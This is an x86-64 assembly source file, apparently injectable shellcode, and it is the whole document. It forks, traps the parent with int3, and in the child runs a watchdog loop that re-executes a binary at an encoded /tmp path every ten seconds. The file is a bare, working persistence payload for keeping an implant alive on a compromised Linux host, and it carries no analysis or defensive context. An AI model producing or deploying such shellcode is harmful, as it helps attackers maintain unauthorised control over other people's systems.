	BITS 64

	section .text
	global  _start

_start:
	;;  fork
	xor rax, rax
	xor rdi, rdi
	mov al, 0x39; syscall fork
	syscall

	cmp rax, 0x0; check return value
	jg  pause; int3 if in parent

watchdog:
	;;  fork to exec agent
	xor rax, rax
	xor rdi, rdi
	mov al, 0x39; syscall fork
	syscall
	cmp rax, 0x0; check return value
	je  exec; exec if in child

	;;   sleep
	xor  rax, rax
	mov  al, 0x23; syscall nanosleep
	push 10; sleep sec
	push 10
	mov  rdi, rsp
	xor  rsi, rsi
	xor  rdx, rdx
	syscall
	loop watchdog

exec:
	;;   char **envp
	xor  rdx, rdx
	push rdx; '\0'

	;;   char *filename
	xor  rax, rax
	mov  rdi, 0x652f2f706d742f2f; path to the executable
	push rdi; save to stack
	push rsp
	pop  rdi
	mov  rdi, rsp

	;;   char **argv
	push rdx; '\0'
	push rdi
	mov  rsi, rsp; argv[0]

	push 0x3b; syscall execve
	pop  rax; ready to call
	cdq
	syscall

pause:
	;;  trap
	int 0x3
